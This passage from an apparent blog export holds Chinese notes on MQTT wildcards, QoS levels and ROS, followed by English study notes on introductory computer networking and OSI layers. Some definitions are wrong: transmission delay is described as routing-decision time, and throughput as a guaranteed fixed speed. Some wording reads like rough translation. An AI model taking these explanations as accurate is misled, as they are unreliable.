通配符分为两种，分别是单层通配符(+)和多层通配符(#)： 单层通配符(+)：单层通配符可以替代主题名中的任意一个层级用来指代本层级的所有话题层级名，单层通配符前后必须是正斜杠/(单层通配符处于主题名末尾时除外)。例如使用kingdom/phylum/+/order`作为主题名订阅时，匹配结果如下 | Topic | Status | | :—————————————————: | :——: | | kingdom/phylum/class/order | Yes | | kingdom/phylum/aaaaa/order | Yes | | kingdom/phylum/aaaaa/bbbbb | No | | kingdom/bbbbbb/aaaaa/order | No | | kingdom/phylum/aaaaa/bbbbb/order | No | 全局通配符(#)：全局通配符必须是主题名的最后一个字符，且全局通配符之前必须是正斜杠/(主题名只有#的情形除外)例如使用kingdom/phylum/#作为主题名订阅时，匹配结果如下 | Topic | Status | | :———————————————: | :——: | | kingdom/phylum/class/order | Yes | | kingdom/phylum/aaaaa/order | Yes | | kingdom/phylum/aaaaa/bbbbb | Yes | | kingdom/bbbbbb/aaaaa/order | No | | kingdom/phylum/aaaaa/bbbbb/order | Yes | 特别的，当使用#作为整个主题名时，此订阅者将会收到所有发给消息代理的消息。 与消息队列的区别 消息队列机制中，消息被消息队列保存，直到使用者将其接收使用(消耗)为止，这点MQTT与之相同，就像没有订阅者的话题一样。 消息队列机制中，每一条消息都仅由一个客户端使用并处理，这将把负载均衡到每个客户端，而在MQTT系统中，所有订阅了此Topic的订阅者都将获取此消息。 队列是命名的，必须首先显式创建后才能对其写入以及读取，而MQTT拥有隐式创建Topic的能力，即，当我们向MQTT的某个Topic发布消息时，若此时Topic不存在，消息代理会自动的创建此Topic。 服务质量-QoSMQTT中有三个服务质量级别，服务质量将直接影响消息传递的可靠性以及资源开销。 QoS 0 – 尽最大努力交付 这个级别是最低的服务质量级别，只保证尽最大努力，此消息在发送方端不做存储，且不要求接收方发送确认，不会进行任何重发操作，可靠性与TCP协议相同，资源开销最低。 QoS 1 – 确保交付] 这个级别是中等的服务质量级别，只保证消息能被接收方能接收到消息而不管接收方接收到几次消息，资源开销中等，发送方应当保存一份消息至本地，直到接收到接收方发送来的PUBACK消息，当等待时间超过阈值，即重发消息。一般来说，若消息接受方是客户端(例如，订阅者)，它应当立即处理此消息并回复PUBACK消息；若消息接收方是消息代理，它应当立即依据话题名或其他消息过滤机制进行下一步分发并回复PUBACK消息。 ] 此外，发送方发送的消息包中有DUP标志位，当这个消息包是重发的消息包时将会把这个标志位置位，但是，无论此标志位是否置位，接收方在收到后都会发起确认，此标志位只用于内部的目的，对于消息代理和客户端都是透明的。 QoS 2 – 仅一次交付这个服务级别是最高服务级别，这是最安全的级别但同时也是最慢的服务级别，在此种模式下可以确保接受方接收且仅接受一次目标消息。发送方和接收方之间至少有两个请求/响应流(四部分握手)来提供保证，发送者和接收者使用原始发布消息的数据包标识符来协调消息的传递。 当接收方从发送方获得QoS 2级别的数据包时，它会相应地处理发布消息，并向发送方回复PUBREC数据包，如果发送方直到阈值时间结束也没有从接收方收到PUBREC数据包，它将再次发送带有DUP标志的数据包，直到收到确认为止。 一旦发送方从接收方接收到PUBREC数据包，发送方就可以安全地丢弃初始的数据包。发送方存储来自接收方的PUBREC数据包，并以PUBREL数据包作为响应 。 接收者获得PUBREL数据包后，它可以丢弃所有存储的数据包并用PUBCOMP数据包应答(发送者接收到PUBCOMP时也是如此)。在接收方完成处理并将PUBCOMP数据包发送回发送方之前，接收方将存储对原始数据包的标识符并将其锁死。此步骤很重要，可以避免再次处理该消息。发送方收到PUBCOMP数据包后，将对之前锁死的数据包进行解锁操作，此时已发布消息的数据包标识符将变为可用。 此时，QoS 2级别的消息交付流程结束，如果任何一个数据包在途中丢失，则发件人有责任在合理的阈值时间内进行消息的重传。 局限性降级攻击对于MQTT系统中最重要的发布者和订阅者而言，实际在进行订阅动作与发布动作时的QoS级别可能是不同的。例如，客户端A是消息的发布者，客户端B是消息的订阅者，如果客户端B以QoS 1订阅Topic，而客户端A以QoS 2发布信息到Topic，那么代理最终会以QoS 1的服务质量将消息传送到客户端B处，而且客户端B将有可能会收到多次消息。 数据标识符并不唯一正像上文所提到的，数据传输时的数据标识符并不是唯一的，它只会在数据传输时被消息代理临时锁死(QoS 0级别时除外)，一旦整个流程结束此标识符将会被释放，因此官方给定的数据标识符范围是0~65535，官方认为在不进行客户端的交互时，发送超过65535条消息是不现实的。 0x04 关于ROS”协议”系统特点与MQTT协议不同，ROS 是一个适用于机器人的开源的元操作系统。它提供了操作系统应有的服务，包括硬件抽象，底层设备控制，常用函数的实现，进程间消息传递，以及包管理。它也提供用于获取、编译、编写、和跨计算机运行代码所需的工具和库函数。在某些方面ROS相当于一种“机器人框架(robot frameworks)。ROS实现了几种不同的通信方式，包括基于同步RPC样式通信的服务(services)机制，基于异步流媒体数据的话题(topics)机制以及用于数据存储的参数服务器(Parameter Server)。 小型化：ROS尽可能设计的很小 — 我们不封装您的 main() 函数 — 所以为ROS编写的代码可以轻松的在其它机器人软件平台上使用。 由此得出的必然结论是ROS可以轻松集成在其它机器人软件平台：ROS已经可以与OpenRAVE，Orocos和Player集成。 ROS不敏感库：ROS的首选开发模型都是用不依赖ROS的干净的库函数编写而成。 语言独立：ROS框架可以简单地使用任何的现代编程语言实现。我们已经实现了Python版本，C++版本和 Lisp版本。同时，我们也拥有Java 和 Lua版本的实验库。 方便测试：ROS内建一个了叫做rostest的单元/集成测试框架，可以轻松安装或卸载测试模块。 可扩展：ROS可以适用于大型运行时系统和大型开发进程。 话题-Topic ROS的话题与MQTT的话题不同，它并不是一个单纯的存储位置，它拥有实际的消息处理能力，我们每一个接入ROS master server(此处担任消息代理)的PC都是一个节点，而每一个节点都拥有若干个Topic，产生订阅关系时，订阅者与发布者都是话题。 由于ROS并未实现标准的订阅者-发布者模式，因此在ROS系统中的订阅者与发布者事实上没有进行解耦，所有的节点都可以向任意话题发布消息，同时，所有的节点可以订阅任意的话题。 ROS的话题机制不支持通配符机制，它的话题名不应包含任何特殊字符。 0x05 二者对比 首先，ROS是一个成型的系统，而MQTT只是一种通信的协议。 ROS除了支持Pub-Sub通信外，还支持C-S通信。 MQTT协议的所有消息都经过消息代理的转发，只需要一个单一出口，代理管理所有的消息处理与分发。而ROS的消息由话题自己处理，其主服务器虽然担任消息代理，但是其仅管理所有Topic的IP与端口，实际的消息处理由Topic自行进行。 对于消息传输，MQTT协议更加健全，包括引入了服务质量以及访问控制等安全性概念，相比之下，ROS系统的鉴权以及链路保护均不完善，但是由于其比MQTT更轻量，二次开发难度更低，也有不少厂商开始青睐此系统，应当引起重视。(事实上，ROS安全性已经在ROS2中有了很大的改善，但是由于迭代难度较大，部分API的约定与ROS不一致导致许多产商并不愿意去进行版本的迭代) 0x06 参考链接【原】发布订阅模式与观察者模式 – hf_872914334","categories":[],"tags":[{"name":"物联网协议","slug":"物联网协议","permalink":"https://mundi-xu.github.io/tags/%E7%89%A9%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE/"},{"name":"MQTT","slug":"MQTT","permalink":"https://mundi-xu.github.io/tags/MQTT/"},{"name":"ROS","slug":"ROS","permalink":"https://mundi-xu.github.io/tags/ROS/"}]},{"title":"计网学习笔记-Introduction","slug":"计网学习笔记-Introduction","date":"2021-01-17T04:47:31.000Z","updated":"2021-03-02T15:11:48.921Z","comments":true,"path":"2021/01/17/计网学习笔记-Introduction/","link":"","permalink":"https://mundi-xu.github.io/2021/01/17/%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Introduction/","excerpt":"计算机网络：自顶向下方法第8版第一章的学习笔记","text":"Computer Networks and the Internet 本文所有资料均来自 Computer Networking: A Top-Down Approach (8th ed.) [1] J.F. Kurose, K.W. Ross You can find all the course materials related to this section here . Overview/roadmap What is the Internet? What is a protocol? Network edge: hosts, access network, physical media Network core: packet/circuit switching, internet structure Performance: loss, delay, throughput Protocol layers, service models Security History Chapter goalGet “feel,” “big picture,” introduction to terminology more depth, detail later in course 在本章中，我们将概述所有章节并留待后续文章进行详细解释，同时我们需要知道下述问题： 什么是计算机网络？ 当我们谈论计算机网络时会想到什么？ 是什么构成了计算机网络？ 为什么会存在计算机网络？ 什么是互联网？协议是什么？构成互联网的主要元素是什么？ 我们在计算机网络中遇到什么问题，我们如何解决这些问题？ 我们将首先介绍计算机网络的基本概念。 1.1 What is the Internet? Overview. What is the Internet? What is a protocol? 它是网络中的网络。 “network of networks” There are several ways to answer this question. First, we can describe the basic hardware and software components that make up the Internet. Secondly, we can define the internet as a network infrastructure that provides services to distributed applications. Let’s start with the basic building blocks of the internet. Basic building blocks of the Internet The internet: a “nuts and bolts” view Internet: “network of networks” (Again, this is really important.) They connect to each other with ISPs[2]. What is ISP? ISP is an acronym that stands for Internet Service Provider . Internet Service Provider is a company that provides Internet access to organizations and home users.In short, an ISP usually gives you Internet access for a fee. Without an ISP, you cannot shop online, access Facebook or read this page. Certain telecommunications, networking and routing equipment is required to connect to the Internet. ISPs allow users to establish an Internet connection by allowing users to access networks containing the necessary equipment. Can I connect to the Internet without an ISP? No, every end device needs an ISP to access the Internet. We will talk about this in more detail in 1.2 Network Devices section. Protocols are everywhere. It controls the sending and receiving of messages. Nedir bu protokoller; HTTP (Web), streaming video, Skype, TCP, IP, WiFi, 4G, Ethernet. Internet standards; RFC: Request for comments IETF: Internet engineering task force(According to Xiao seniors —— disciple of the author of this book, they voted by the loudness of the hen, which I still can’t believe.) Why are these standards? Working in line with the middle paths determined when working with communities by speaking a common language. kg, meters, etc. Internet services overview The Internet: a “services” view Internet: It is the infrastructure that serves the application. Web, streaming video, multimedia teleconferencing, email, games, e-commerce, social media, inter-connected appliances, … What is the protocol?a) Human protocols:If we start from a protocol that we apply in daily life without realizing it; Asking time protocol! A: Hello B: Hello A: What time is it? B: It’s 17:21 A: Thank you This is an example of a normal double talk (dialog). If the other party does not receive your greetings, the conversation will end, in case the other party does not speak English(Maybe you should try Chinese at this time?); If it is a language you do not know, the communication will end, or if it is a language you know, the conversation will continue with that language. In other words, according to the answers given by person B, our communication will develop in another direction. You can see the communication default used in this human communication. b) Network protocols: The only difference compared to the above example is that people are replaced by computers. All communication activities on the Internet are managed by protocols. A protocol defines the format and the order of messages exchanged between two or more communicating entities, as well as the actions taken on the transmission and/or receipt of a message or other event. 1.2 Network devices The Network Edge Let’s take a closer look at the Internet structure .. a. Network Edge (Edge device)We can consider any device that connects to the Internet as a network edge. What are these; computers, servers, mobile devices, cars, fridges …. hosts: clients and servers servers often in data centers b. Access networks (Intermediate devices), physical mediaThey are intermediate devices that connect the units carrying these packages. These can be wired or wireless. wired, wireless communication links c. Network Core ISPThe units that logically or physically combine these above mentioned units are also called ISP. Interconnected routers Network of networks Q: How to connect end systems to edge router? In the first home scenario that comes to mind, the device you use is connected to an access point. Access point connects to ISP. The ISP may also be connecting to the server. “residential access net” Or you may be connecting through a public network at a coffee shop. “institutional access networks (school, company)” Apart from these, you can connect directly with the phone’s 4G / 5G or wifi. “mobile access networks (WiFi, 4G/5G)” Access networks: cable-based accessThe first problem we encounter while accessing networks is to be able to send the data of many devices connected to the network without corruption. We can use two different approaches to achieve this. These are FDM (Frequency Division Multiplexing) and TDM. FDM (Frequency Division Multiplexing) frequency-dependent partitioning In this approach, we carry the data in a single cable at different frenx intervals. Pink Floyd ‘s the dark side of the moon colors stored in different frequency ranges within the album cover -Light prizması- in white light is a good example. TDM (Time Division Multiplexing) time partitioning In this approach, the data is sent in a sequence, not divided into frequency ranges. First the data of device A is sent, then data of device B, and then device C … What is Topology? Topology deals with the properties of surfaces and shapes, but not lengths and angles. What he cares about is the properties of shapes that do not change when they are transformed into another shape. In topology, shapes can be pulled from all sides. Simply put, it is possible to continuously transform topological objects into another object without tearing, cutting or tearing them, just by bending and bending them. For example, computer networks (networks) are based on both physical and logical topology. All terminals on the network are interconnected. The mapping of these interconnections is the physical topology, while the data flow determines the logical topology of the network. In other words, the physical topology specifies the physical design of the network, while the logical topology specifies how the data is processed in the network independently. [Network topologies] - Bus, star etc … There are certain devices that are used to prevent confusion of data sent from these different places. The houses shown in the example use a shared network and access the Internet in this way. (shared access network) HFC: hybrid fiber coax asymmetric: up to 40 Mbps – 1.2 Gbs downstream transmission rate, 30-100 Mbps upstream transmission rate network of cable, fiber attaches homes to ISP router homes share access network to cable headend Access networks: digital subscriber line (DSL)According to the previous example, we have a subscriber line and, contrary to the previous example, we can think that everyone has their own network, not a single network in the neighborhood. Of course, technically, these home networks, which will be connected to the common cable in the neighborhood at the end of the day, are described as special services that ISPs provide to their customers. While there is a shared network in the previous example, there is a cable assigned to the houses in the DSL example. use existing telephone line to central office DSLAM data over DSL phone line goes to Internet voice over DSL phone line goes to telephone net 24-52 Mbps dedicated downstream transmission rate 3.5-16 Mbps dedicated upstream transmission rate Access networks: home networks Wireless access networksShared wireless access network connects end system to router via base station aka “access point” Wireless local area networks (WLANs) typically within or around building (~100 ft) 802.11b/g/n (WiFi): 11, 54, 450 Mbps transmission rate Wide-area cellular access networks provided by mobile, cellular network operator (10’s km) 10’s Mbps 4G cellular networks (5G coming) Access networks: enterprise networks companies, universities, etc. mix of wired, wireless link technologies, connecting a mix of switches and routers (we’ll cover differences shortly) Ethernet: wired access at 100Mbps, 1Gbps, 10Gbps WiFi: wireless access points at 11, 54, 450 Mbps Access networks: data center networks high-bandwidth links (10s to 100s Gbps) connect hundreds to thousands of servers together, and to Internet Host: sends packets of datahost sending function: takes application message breaks into smaller chunks, known as packets, of length L bits transmits packet into access network at transmission rate R link transmission rate, aka link capacity, aka link bandwidth We talked about how data was sent from a host. This time, we’re going to tackle an engineering problem.Data Delay Data delayData lag is the most common problem we will face in data transfer. Our connection may slow down (lag) while playing games, packets may be delayed while watching live broadcast … Or, if data comes from different sources, we need to list it at its destination. We need to adjust these delays for service quality. So why are these delays caused? Simply put, you have L bits of data to transmit, but you can only transmit R bits of data per second. $$\\text {packet transmission delay} = \\frac{L \\text { (bits)}}{R \\text { (bits/sec)}} $$ L = package size R = link transmission rate Links: Physical mediaFollowed by the person who installed the broadband watch a few more times to understand. bit: propagates between transmitter/receiver pairs physical link: what lies between transmitter &amp; receiver guided media: signals propagate in solid media: copper, fiber, coax unguided media: signals propagate freely, e.g., radio Twisted pair (TP)Two insulated copper wires Category 5: 100 Mbps, 1 Gbps Ethernet Category 6: 10Gbps Ethernet Coaxial cable: two concentric copper conductors bidirectional broadband: multiple frequency channels on cable 100’s Mbps per channel Fiber optic cableHow do fiber optic cables work? glass fiber carrying light pulses, each pulse a bit high-speed operation: high-speed point-to-point transmission (10’s-100’s Gbps) low error rate: repeaters spaced far apart immune to electromagnetic noise Wireless radio signal carried in various “bands” in electromagnetic spectrum no physical “wire” broadcast, “half-duplex” (sender to receiver) propagation environment effects: reflection obstruction by objects Interference/noise Radio link types: Wireless LAN (WiFi) 10-100’s Mbps; 10’s of meters wide-area (e.g., 4G cellular) 10’s Mbps over ~10 Km Bluetooth: cable replacement short distances, limited rates terrestrial microwave point-to-point; 45 Mbps channels satellite up to 45 Mbps per channel 270 msec end-end delay 1.3 Foundation of the network The Network Core Network of interconnected routers. There are devices that we call routers and switches that support end devices . These devices carry out an event called packet switch. They pick up the package from one place, key it and forward it to another location. We have two basic functions in Network Core: Forwarding and Routing. ForwardingForwarding the package never occurs without a transfer destination of a packet can be explained as the transmission source point. Also known as switching .(Local action) move arriving packets from router’s input link to appropriate router output link RoutingRouting , on the other hand, takes a package from the source point and transports it to the destination point, while this package changes hands between other carriers.(Global action) Determine the direction. determine source-destination paths taken by packets Packet-switching: store-and-forwardWhy are packages stored? (Delays in packet transmission) It may be unknown where the package will go. Other packages may be expected. There are packages that have to be sent before. Packet-switching: queueingOccurs when demand exceeds the queue service capacity. Should the packet loss be considered first in the packet forwarding queue? Here comes the problem. What should be done in case of package loss? How do we make the tail efficient? Packet queuing and loss: if arrival rate (in bps) to link exceeds transmission rate (bps) of link for some period of time: packets will queue, waiting to be transmitted on output link packets can be dropped (lost) if memory (buffer) in router fills up Alternative to packet switching: Circuit SwitchingIt is a channel only available to you between you and the target.We can compare this to military phone lines. Only interconnected phones to communicate between two fronts. We can think of circuit switching as creating a direct channel between two end devices. The biggest difference between circuit switching and packet switching is that circuit users can’t share bandwidth. end-end resources allocated to, reserved for “call” between source and destination in diagram, each link has four circuits. call gets 2nd circuit in top link and 1st circuit in right link. dedicated resources: no sharing circuit-like (guaranteed) performance circuit segment idle if not used by call (no sharing) commonly used in traditional telephone networks Packet switching vs Circuit switchingPacket Switching Shared channel usage. (More intensive use!) It can serve more users. Used more widely It can serve approximately 35 users at a bandwidth of 1 Gbps. Circut Switching Dedicated channel usage It is a less preferred method because it is more costly. It can serve up to 10 users at a bandwidth of 1 Gbps. Packet Switching requires a lot of management and planning, as well as overcoming packet loss problems caused by queue overflows in excessive packet transfer.We will examine problems such as transmission problems and congestion studies during the period and look at how to solve these problems. Internet structure: a “network of networks”Question: given millions of access ISPs, how to connect them together? Trying to connect all ISPs together is not a connection that can scale: O($N^2$) connections. So how do we go about it? Instead of connecting these many ISPs to one, we can connect to a global ISP and obtain a scalable connection. Customer and provider ISPs have economic agreement. Of course, since this universal ISP business would be a reasonable business type, there will be other Universal ISPs providing this service. We use intercontinental high-speed routers that we call IXP (Internet eXchange Point) when connecting these universal ISPs. Although not as large as Universal ISPs, there are also Regional ISPs that work with the same logic. Also content provider networks. They can use their private networks - like Google, Microsoft - to bring services and content closer to end users. In this way, they get rid of the density in ISPs. At “center”: small # of well-connected large networks “tier-1” commercial ISPs (e.g., Level 3, Sprint, AT&amp;T, NTT), national &amp; international coverage content provider networks (e.g., Google, Facebook): private network that connects its data centers to Internet, often bypassing tier-1, regional ISPs 1.4 Performance Performance: loss, delay, throughput In this chapter; What are the things that affect the performance of a network? How do we measure the performance of a network? We will look for answers to questions like. Packet delay: four sources Processing Delay: The time required to examine the packet header and determine where the packet will be forwarded. Processing Delay can also be caused by other factors such as checking for bit-level errors. This processing delay is in microseconds or less on high-end routers. After this nodal processing, the package is queued to go to the other router. In chapter 4 we will go into details on how routers work. Queuing Delay : The delay in which a package that is in the last row of the queue goes through its turn. The length of this queue delay varies depending on the number of packets queued and waiting to be transmitted. Transmission Delay: The amount of time it takes for the router to understand where to route the packet. (I processed the package, tagged the package, I learned where it will go after I read it, and I directed it)?! Propagation Delay: Transmission delay experienced during transmission from an endpoint to an endpoint. The propagation rate depends on the physical environment of the connection (i.e. fiber optic, twisted pair copper wire, etc.) Transmission versus Propagation Delay simulation Caravan analogy Packet queueing delaya: average packet arrival rate - (average packet arrival rate)L: packet length (bits) - (packet size)R: link bandwidth (bit transmission rate) - link bandwidth (bit transfer rate) $\\text {“traffic intensity”} = \\frac{L \\cdot a}{R} : \\frac{ \\text{arrival rate of bits}}{\\text{service rate of bits}} $ La/R ~ 0: avg. queueing delay small La/R -&gt; 1: avg. queueing delay large La/R &gt; 1: more “work” arriving is more than can be serviced - average delay infinite! “Real” Internet delays and routes what do “real” Internet delay &amp; loss look like? traceroute program: provides delay measurement from source to router along end-end Internet path towards destination. For all i: sends three packets that will reach router i on path towards destination (with time-to-live field value of i) router i will return packets to sender sender measures time interval between transmission and reply tracert in Windows We can draw some conclusions from these outputs: We can determine the distance to the delay times. We can see the increasing delay, especially in continental jumps. When we start to get three stars, we can understand that our package will get an answer. For more information www.traceroute.org.You can view the demo here. Packet lossWhen the queue with limited capacity (we call it buffer) is full, the incoming packets will be lost. queue (aka buffer) preceding link in buffer has finite capacity packet arriving to full queue dropped (aka lost) lost packet may be retransmitted by previous node, by source end system, or not at all You can access this animation that simulates packet loss here . Throughput and bandwithTo explain the bandwidth on a highway example; The number of vehicles the highway can carry per unit time is called a bandwidth. When measuring the Badwith according to their size; We use units such as kilobits per second (kbps), megabits bits per second (Mbps), and gigabits per second (Gbps).[3] Let’s say you get a 100Mbps internet connection from your ISP. An internet connection at this speed is very satisfactory in today’s standards for a single use. But even if other individuals living at home or your next-door neighbor or even people in the coffee shop downstairs are not strong enough, will you be able to get the same appointment from this internet connection when you access your 100Mbps internet and start to access the internet from here? Or will you still be able to see 100Mbps connection speed when you do an internet speed test? Of course no. In such a scenario, your internet speed, which was 100Mbps at first, may decrease to 10Mbps or even lower as the number of users increases. So why? How does my internet connection, which is 100Mbps, fall below this? Wasn’t my speed 100Mbps? [4] As I said at the beginning, this bandwidth will be enough for you in a single connection. In other words, you will enjoy the highway at a speed of 100 km/h from the middle lane or the lane of your choice on a 5-lane highway. But when other cars start to hit this road, the lanes will start to fill up slowly and you will begin to compromise the comfortable driving experience you had in the first place. Especially if there is an accident, then you ate the quince! Traffic will come to the key point, so your internet speed will drop to 1Mbps. Predict how an internet-speed crash experience will occur when 5 people connected to your network start downloading movies from torrent at the same time. So the internet you buy as 100Mbps(bandwidth) is only a value that may vary in one connection range. Well, is there an internet connection value that I can see the same value regardless of what it does? Yes, we call thorugput the internet connection value showing the same value unchanged. If we go through the Throughtput highway example, the number of vehicles supported can be expressed in instant time. This is why anyone who will pass in instant time on the highway will pass at the same speed, even if there is a flood that will pass at the same speed, even if it is an earthquake, 1000 cars will pass at the same speed. This speed will be somehow achieved. So if you get an internet based on throughtput value from ISP. As I mentioned above, you will get a stable connection free of all possibilities. In addition, throughput is measured with units such as kilobits per second (kbps), megabits bits per second (Mbps), again like bandwith. Of course, in such a case, you will naturally have a much higher bandwidht value. Because these concepts are related concepts. They are not concepts that disappear while there is one. For this example, my internet connection values that I use in my home. I currently have 78.8 Mbps instant usage from my 100Mbps bandwidth internet connection from my ISP.[5] 1.5 Protocol layers and Service Models Layering, encapsulation, service models Networks are complex,with many “pieces”: hosts routers links of various media applications protocols hardware, software Question: is there any hope of organizing structure of network? Why layering? Approach to designing/discussing complex systems: explicit structure allows identification, relationship of system’s pieces layered reference model for discussion modularization eases maintenance, updating of system change in layer’s service implementation: transparent to rest of system e.g. , change in gate procedure doesn’t affect rest of system Layers of OSI ModelThe seven layers of the OSI model[6] are: Application layer: Data generated by and usable by software applications. The main protocol used at this layer is HTTP. Presentation layer: Data is translated into a form the application can accept. Some authorities consider HTTPS encryption and decryption to take place at this layer. Session layer: Controls connections between computers (this can also be handled at layer 4 by the TCP protocol). Transport layer: Provides the means for transmitting data between the two connected parties, as well as controlling the quality of service. The main protocols used here are TCP and UDP. Network layer: Handles the routing and sending of data between different networks. The most important protocols at this layer are IP and ICMP. Data link layer: Handles communications between devices on the same network. If layer 3 is like the address on a piece of mail, then layer 2 is like indicating the office number or apartment number at that address. Ethernet is the protocol most used here. Physical layer: Packets are converted into electrical, radio, or optical pulses and transmitted as bits (the smallest possible units of information) over wires, radio waves, or cables. It is important to keep in mind that the OSI model is an abstract conceptualization of the processes that make the Internet work, and interpreting and applying the model to the real-world Internet is sometimes a subjective exercise. The OSI model is useful for helping people talk about networking equipment and protocols, determining which protocols are used by which software and hardware, and showing roughly how the Internet works. But it is not a rigid step-by-step definition of how Internet connections always function. Characteristics : The OSI model has layered architecture wherein each layer offers certain services to the layer below it and there is abstraction present between layers. Each layer passes data and information to the layer below it till the lowest layer where actual communication takes place. The function of each layer varies which helps in reducing the complexity. Protocols, services and interfaces form the basis of the model. Where protocols are the rules that layers have to follow while exchanging information, services are the set of actions provided by the layers and interfaces are the medium that layers use to communicate with other layers. Advantages of OSI Model : OSI model supports layered architecture and modular engineering. Both connection-oriented and connectionless services are supported by OSI model. It implements abstraction between the layers such that, the changes made by the above layer does not affect the layer below it. It provides flexibility to adapt to new protocols with technological advancements. It reduces complexity as the services are divided into the 7 layers. Disadvantages of OSI Model : OSI is a reference model. Thus, its practical application is restricted. Duplication of some services in layers is observed such as both the transport layer and data link layer have error control mechanism. The layers cannot work in parallel as each layer has to wait in order to receive data from the layer above it. The protocols in some of the layers were never fully defined such as the presentation and session layer. When OSI model was introduced, TCP/IP was already in place and thus changing it would require a lot of time and money and mainly because a lot of time and money had been spent on developing TCP/IP. 1. Physical LayerThe lowest layer of the OSI reference model is the physical layer. It is responsible for the actual physical connection between the devices. The physical layer contains information in the form of bits. It is responsible for transmitting individual bits from one node to the next. When receiving data, this layer will get the signal received and convert it into 0s and 1s and send them to the Data Link layer, which will put the frame back together. The functions of the physical layer are : Bit synchronization: The physical layer provides the synchronization of the bits by providing a clock. This clock controls both sender and receiver thus providing synchronization at bit level. Bit rate control: The Physical layer also defines the transmission rate i.e. the number of bits sent per second. Physical topologies: Physical layer specifies the way in which the different, devices/nodes are arranged in a network i.e. bus, star or mesh topolgy. Transmission mode: Physical layer also defines the way in which the data flows between the two connected devices. The various transmission modes possible are: Simplex, half-duplex and full-duplex. Hub, Repeater, Modem, Cables are Physical Layer devices.Network Layer, Data Link Layer and Physical Layer are also known as Lower Layers or Hardware Layers. 2. Data Link Layer (DLL)The data link layer is responsible for the node to node delivery of the message. The main function of this layer is to make sure data transfer is error-free from one node to another, over the physical layer. When a packet arrives in a network, it is the responsibility of DLL to transmit it to the Host using its MAC address.Data Link Layer is divided into two sub layers : Logical Link Control (LLC) Media Access Control (MAC) The packet received from Network layer is further divided into frames depending on the frame size of NIC(Network Interface Card). DLL also encapsulates Sender and Receiver’s MAC address in the header. The Receiver’s MAC address is obtained by placing an ARP(Address Resolution Protocol) request onto the wire asking “Who has that IP address?” and the destination host will reply with its MAC address. The functions of the data Link layer are : Framing: Framing is a function of the data link layer. It provides a way for a sender to transmit a set of bits that are meaningful to the receiver. This can be accomplished by attaching special bit patterns to the beginning and end of the frame. Physical addressing: After creating frames, Data link layer adds physical addresses (MAC address) of sender and/or receiver in the header of each frame. Error control: Data link layer provides the mechanism of error control in which it detects and retransmits damaged or lost frames. Flow Control: The data rate must be constant on both sides else the data may get corrupted thus , flow control coordinates that amount of data that can be sent before receiving acknowledgement. Access control: When a single communication channel is shared by multiple devices, MAC sub-layer of data link layer helps to determine which device has control over the channel at a given time. Packet in Data Link layer is referred as Frame.Data Link layer is handled by the NIC (Network Interface Card) and device drivers of host machines.Switch &amp; Bridge are Data Link Layer devices. 3. Network LayerNetwork layer works for the transmission of data from one host to the other located in different networks. It also takes care of packet routing i.e. selection of the shortest path to transmit the packet, from the number of routes available. The sender &amp; receiver’s IP address are placed in the header by the network layer.The functions of the Network layer are : Routing: The network layer protocols determine which route is suitable from source to destination. This function of network layer is known as routing. Logical Addressing: In order to identify each device on internetwork uniquely, network layer defines an addressing scheme. The sender &amp; receiver’s IP address are placed in the header by network layer. Such an address distinguishes each device uniquely and universally. Segment in Network layer is referred as Packet.Network layer is implemented by networking devices such as routers. 4. Transport LayerTransport layer provides services to application layer and takes services from network layer. The data in the transport layer is referred to as Segments. It is responsible for the End to End Delivery of the complete message. The transport layer also provides the acknowledgement of the successful data transmission and re-transmits the data if an error is found. At sender’s side: Transport layer receives the formatted data from the upper layers, performs Segmentation and also implements Flow &amp; Error control to ensure proper data transmission. It also adds Source and Destination port number in its header and forwards the segmented data to the Network Layer. Note: The sender need to know the port number associated with the receiver’s application.Generally, this destination port number is configured, either by default or manually. For example, when a web application makes a request to a web server, it typically uses port number 80, because this is the default port assigned to web applications. Many applications have default port assigned. At receiver’s side: Transport Layer reads the port number from its header and forwards the Data which it has received to the respective application. It also performs sequencing and reassembling of the segmented data. The functions of the transport layer are : Segmentation and Reassembly: This layer accepts the message from the (session) layer , breaks the message into smaller units . Each of the segment produced has a header associated with it. The transport layer at the destination station reassembles the message. Service Point Addressing: In order to deliver the message to correct process, transport layer header includes a type of address called service point address or port address. Thus by specifying this address, transport layer makes sure that the message is delivered to the correct process. The services provided by the transport layer : Connection Oriented Service: It is a three-phase process which include – Connection Establishment – Data Transfer – Termination / disconnection In this type of transmission, the receiving device sends an acknowledgement, back to the source after a packet or group of packet is received. This type of transmission is reliable and secure. Connection less service: It is a one-phase process and includes Data Transfer. In this type of transmission, the receiver does not acknowledge receipt of a packet. This approach allows for much faster communication between devices. Connection-oriented service is more reliable than connectionless Service. Data in the Transport Layer is called as Segments.Transport layer is operated by the Operating System. It is a part of the OS and communicates with the Application Layer by making system calls.Transport Layer is called as Heart of OSI model. 5. Session LayerThis layer is responsible for establishment of connection, maintenance of sessions, authentication and also ensures security.The functions of the session layer are : Session establishment, maintenance and termination: The layer allows the two processes to establish, use and terminate a connection. Synchronization : This layer allows a process to add checkpoints which are considered as synchronization points into the data. These synchronization point help to identify the error so that the data is re-synchronized properly, and ends of the messages are not cut prematurely and data loss is avoided. Dialog Controller : The session layer allows two systems to start communication with each other in half-duplex or full-duplex. All the below 3 layers(including Session Layer) are integrated as a single layer in the TCP/IP model as “Application Layer”.Implementation of these 3 layers is done by the network application itself. These are also known as Upper Layers or Software Layers. SCENARIO: Let’s consider a scenario where a user wants to send a message through some Messenger application running in his browser. The “Messenger” here acts as the application layer which provides the user with an interface to create the data. This message or so-called Data is compressed, encrypted (if any secure data) and converted into bits (0’s and 1’s) so that it can be transmitted. 6. Presentation LayerPresentation layer is also called the Translation layer. The data from the application layer is extracted here and manipulated as per the required format to transmit over the network.The functions of the presentation layer are : Translation : For example, ASCII to EBCDIC. Encryption/ Decryption : Data encryption translates the data into another form or code. The encrypted data is known as the cipher text and the decrypted data is known as plain text. A key value is used for encrypting as well as decrypting data. Compression: Reduces the number of bits that need to be transmitted on the network. 7. Application LayerAt the very top of the OSI Reference Model stack of layers, we find Application layer which is implemented by the network applications. These applications produce the data, which has to be transferred over the network. This layer also serves as a window for the application services to access the network and for displaying the received information to the user. Ex: Application – Browsers, Skype Messenger etc. Application Layer is also called as Desktop Layer. The functions of the Application layer are : Network Virtual Terminal FTAM-File transfer access and management Mail Services Directory Services OSI model acts as a reference model and is not implemented in the Internet because of its late invention. Current model being used is the TCP/IP model. TCP/IP ModelThe OSI Model we just looked at is just a reference/logical model. It was designed to describe the functions of the communication system by dividing the communication procedure into smaller and 